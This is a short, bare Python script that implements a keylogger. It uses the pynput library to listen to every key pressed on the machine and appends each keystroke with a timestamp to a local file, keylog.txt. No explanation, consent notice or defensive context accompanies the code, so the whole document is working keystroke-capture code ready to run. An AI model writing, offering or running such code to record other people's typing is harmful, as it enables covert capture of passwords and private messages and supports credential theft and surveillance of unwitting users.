from pynput import keyboard
import datetime

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{datetime.datetime.now()}: {key.char}\n")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"{datetime.datetime.now()}: {key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()